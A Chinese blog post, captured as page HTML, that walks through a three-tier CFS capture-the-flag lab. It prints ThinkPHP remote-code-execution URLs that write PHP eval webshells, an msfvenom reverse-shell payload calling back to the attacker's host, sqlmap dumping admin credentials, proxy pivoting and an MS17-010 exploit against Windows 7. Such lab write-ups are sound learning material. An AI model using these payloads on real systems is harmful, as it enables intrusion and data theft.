@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="尝试下cfs三层靶机渗透，接近实战环境，因为要建立多层代理环境配置拓扑图各主机账号密码Centos：root/ teamssix.com Ubuntu：root/ teamssix.comWin7：administrator/teamssix.comCentos配置网站centos和ubuntu主机需如下配置">
+<meta name="keywords" content="red team">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cfs三层靶机渗透">
+<meta property="og:url" content="https://choge.top/2021/02/20/cfs三层靶机渗透/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="尝试下cfs三层靶机渗透，接近实战环境，因为要建立多层代理环境配置拓扑图各主机账号密码Centos：root/ teamssix.com Ubuntu：root/ teamssix.comWin7：administrator/teamssix.comCentos配置网站centos和ubuntu主机需如下配置">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210219162819273.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163006337.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163032951.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163116499.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094140826.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094209040.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094249920.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094507319.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094456005.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094547520.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094613332.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094633661.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094754241.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094731943.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094814005.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094913700.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094944830.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095412834.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095430702.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095452316.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095552921.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095642724.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095756811.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095940237.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095955024.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100041306.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100142236.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100225044.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100310646.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100350846.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100429097.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100450890.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100538199.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100709005.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100834380.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100853644.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100931875.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101050169.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101151211.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101212102.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101247682.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101311165.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101340357.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101416808.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101433455.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101507601.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101529006.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101643982.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101707588.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101727151.png">
+<meta property="og:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101753208.png">
+<meta property="og:updated_time" content="2021-02-22T02:18:14.142Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cfs三层靶机渗透">
+<meta name="twitter:description" content="尝试下cfs三层靶机渗透，接近实战环境，因为要建立多层代理环境配置拓扑图各主机账号密码Centos：root/ teamssix.com Ubuntu：root/ teamssix.comWin7：administrator/teamssix.comCentos配置网站centos和ubuntu主机需如下配置">
+<meta name="twitter:image" content="https://choge.top/2021/02/20/cfs三层靶机渗透/image-20210219162819273.png">
+  <link rel="canonical" href="https://choge.top/2021/02/20/cfs三层靶机渗透/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>cfs三层靶机渗透 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2021/02/20/cfs三层靶机渗透/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            cfs三层靶机渗透
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2021-02-20 16:23:13" itemprop="dateCreated datePublished" datetime="2021-02-20T16:23:13+08:00">2021-02-20</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-22 10:18:14" itemprop="dateModified" datetime="2021-02-22T10:18:14+08:00">2021-02-22</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>2.9k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>3 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>尝试下cfs三层靶机渗透，接近实战环境，因为要建立多层代理</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>拓扑图</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219162819273.png" alt="image-20210219162819273"></p><p>各主机账号密码</p><p>Centos：root/ teamssix.com </p><p>Ubuntu：root/ teamssix.com</p><p>Win7：administrator/teamssix.com</p><p>Centos配置网站centos和ubuntu主机需如下配置</p><a id="more"></a>
+
+
+
+
+
+
+
+<p>http://靶机外网ip:8888/a768f109/</p>
+<p><strong>账号：</strong>eaj3yhsl，<strong>密码：</strong>41bb8fee，根据实际靶机ip，配置网站</p>
+<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-O</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.19</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163006337.png" alt="image-20210219163006337"></p>
+<p>访问80端口为thinkphp</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163032951.png" alt="image-20210219163032951"></p>
+<p>尝试payload</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.19/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>
+
+<p>存在漏洞</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163116499.png" alt="image-20210219163116499"></p>
+<p>写入webshell</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.19</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=file_put_contents&amp;vars[<span class="number">1</span>][]=shell.php&amp;vars[<span class="number">1</span>][]=%3C?php%20@eval($_GET[%22code%22])?%3Ei http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.19</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=file_put_contents&amp;vars[<span class="number">1</span>][]=shell.php&amp;vars[<span class="number">1</span>][]=%3C?php%20@eval($_GET[%22code%22])?%3Ei</span><br><span class="line"><span class="comment">###注意结尾多了一个i</span></span><br></pre></td></tr></table></figure>
+
+<p>查看写入成功</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094140826.png" alt="image-20210222094140826"></p>
+<p>蚁剑连接失败</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094209040.png" alt="image-20210222094209040"></p>
+<p>更换payload重新写入</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://192.168.1.19/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=system&amp;vars[1][]=echo%20%22%3C?php%20eval(\$<span class="emphasis">_POST[cmd]);?%3E%22%20%3Eshell.php</span></span><br></pre></td></tr></table></figure>
+
+<p>写入成功，找到第一个flag</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094249920.png" alt="image-20210222094249920"></p>
+<p>网络上还有另一种方法，我这边也来尝试下</p>
+<p>Kali开启监听</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094507319.png" alt="image-20210222094507319"></p>
+<p>反弹shell</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094456005.png" alt="image-20210222094456005"></p>
+<p>使用python获取一枚 bash：</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094547520.png" alt="image-20210222094547520"></p>
+<p>找到第二个flag</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094613332.png" alt="image-20210222094613332"></p>
+<p><code>uname -a</code>查看系统内核</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094633661.png" alt="image-20210222094633661"></p>
+<p>尝试使用msf获取meterpreter</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.1</span><span class="number">.15</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094754241.png" alt="image-20210222094754241"></p>
+<p>成功后上传修改权限</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094731943.png" alt="image-20210222094731943"></p>
+<p>成功获取shell并收集一些信息</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094814005.png" alt="image-20210222094814005"></p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>添加路由</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094913700.png" alt="image-20210222094913700"></p>
+<p>使用<code>auxiliary/scanner/portscan/tcp</code>进行端口扫描探测</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094944830.png" alt="image-20210222094944830"></p>
+<p>发现80端口放开</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095412834.png" alt="image-20210222095412834"></p>
+<p>建立socks4a代理查看80端口内容</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095430702.png" alt="image-20210222095430702"></p>
+<p>vim /etc/proxychains.conf</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095452316.png" alt="image-20210222095452316"></p>
+<p>再来一波nmap端口探测</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">proxychains</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-Pn</span> <span class="selector-tag">-sT</span> 192<span class="selector-class">.168</span><span class="selector-class">.192</span><span class="selector-class">.129</span></span><br><span class="line">##因为<span class="selector-tag">socket</span>代理不支持<span class="selector-tag">arp</span>，<span class="selector-tag">icmp</span>这种协议，所以用<span class="selector-tag">tcp</span>扫描</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095552921.png" alt="image-20210222095552921"></p>
+<p>外网连接代理，下图有点问题，协议应为socks而非http</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095642724.png" alt="image-20210222095642724"></p>
+<p>可以访问，但访问不到网站</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095756811.png" alt="image-20210222095756811"></p>
+<p>此时需要根据提示重新配置下环境</p>
+<p><a href="http://192.168.192.129:8888/2cc52ec0/" target="_blank" rel="noopener">http://192.168.192.129:8888/2cc52ec0/</a></p>
+<p>使用xdynr37d/766e248d无法登陆</p>
+<p>直接在主机输入命令修改密码</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/www/server/panel</span> &amp;&amp; python tools.pyc panel testpasswd</span><br><span class="line"><span class="comment">##密码修改为testpasswd</span></span><br></pre></td></tr></table></figure>
+
+<p>xdynr37d/testpasswd登陆</p>
+<p>进行网站添加</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095940237.png" alt="image-20210222095940237"></p>
+<p>再次访问成功</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095955024.png" alt="image-20210222095955024"></p>
+<p>通过代理进行目录探测</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains dirb <span class="string">http:</span><span class="comment">//192.168.192.129</span></span><br></pre></td></tr></table></figure>
+
+<p>部分扫描结果，发现robots.txt</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100041306.png" alt="image-20210222100041306"></p>
+<p>查看robots.txt发现敏感信息</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100142236.png" alt="image-20210222100142236"></p>
+<p>找到后台</p>
+<p><a href="http://192.168.192.129/index.php?r=admini/public/login" target="_blank" rel="noopener">http://192.168.192.129/index.php?r=admini/public/login</a></p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100225044.png" alt="image-20210222100225044"></p>
+<p>再查看首页源代码，发现注入点</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100310646.png" alt="image-20210222100310646"></p>
+<p>kali下使用代理开启sqlmap</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap <span class="string">"-u http://192.168.192.129/index.php?r=vul&amp;keyword=1"</span> -<span class="selector-tag">p</span> keyword</span><br></pre></td></tr></table></figure>
+
+<p>发现注入漏洞</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100350846.png" alt="image-20210222100350846"></p>
+<p>一步步渗透注入，最后获取用户密码</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">proxychains</span> sqlmap <span class="string">"-u http://192.168.192.129/index.php?r=vul&amp;keyword=1"</span> -p keyword -D <span class="keyword">bagecms </span>-T <span class="keyword">bage_admin </span>-C username,password –dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100429097.png" alt="image-20210222100429097"></p>
+<p>登陆后台找到第三个flag</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100450890.png" alt="image-20210222100450890"></p>
+<p>在后台模版文件写shell</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100538199.png" alt="image-20210222100538199"></p>
+<p>尝试写入webshell</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100709005.png" alt="image-20210222100709005"></p>
+<p>讲蚁剑上传到kali，代理启动</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains <span class="string">./AntSword</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="http://192.168.192.129/index.php?r=tag" target="_blank" rel="noopener">http://192.168.192.129/index.php?r=tag</a></p>
+<p>连接成功</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100834380.png" alt="image-20210222100834380"></p>
+<p>找到第四个flag</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100853644.png" alt="image-20210222100853644"></p>
+<p>连接非常不稳定，尝试下Kali自带的Webshell管理工具Weevely，发现更不稳定</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100931875.png" alt="image-20210222100931875"></p>
+<p>尝试获取meterpreter，生成一个正向马去连接ubuntu</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<span class="number">5555</span> -f elf &gt; <span class="number">5555.</span>elf</span><br></pre></td></tr></table></figure>
+
+<p>代理形式打开msf，<code>proxychains msfconsole</code></p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101050169.png" alt="image-20210222101050169"></p>
+<p>连接成功，获取meterpreter</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101151211.png" alt="image-20210222101151211"></p>
+<p>查看网段信息</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101212102.png" alt="image-20210222101212102"></p>
+<p>继续建立新的路由<code>run autoroute -s 192.168.33.0/24</code></p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101247682.png" alt="image-20210222101247682"></p>
+<p>端口扫描</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101311165.png" alt="image-20210222101311165"></p>
+<p>看扫描结果推测为windows主机</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101340357.png" alt="image-20210222101340357"></p>
+<p>尝试使用smb协议探测，使用模块<code>auxiliary/scanner/smb/smb_version</code></p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101416808.png" alt="image-20210222101416808"></p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101433455.png" alt="image-20210222101433455"></p>
+<p>445端口开放，再尝试ms17-010漏洞探测</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101507601.png" alt="image-20210222101507601"></p>
+<p>存在漏洞</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101529006.png" alt="image-20210222101529006"></p>
+<p>使用<code>exploit/windows/smb/ms17_010_psexec</code>进行权限获取</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101643982.png" alt="image-20210222101643982"></p>
+<p>设置正向连接payload</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101707588.png" alt="image-20210222101707588"></p>
+<p>获取权限成功</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101727151.png" alt="image-20210222101727151"></p>
+<p>找到第五个flag</p>
+<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101753208.png" alt="image-20210222101753208"></p>
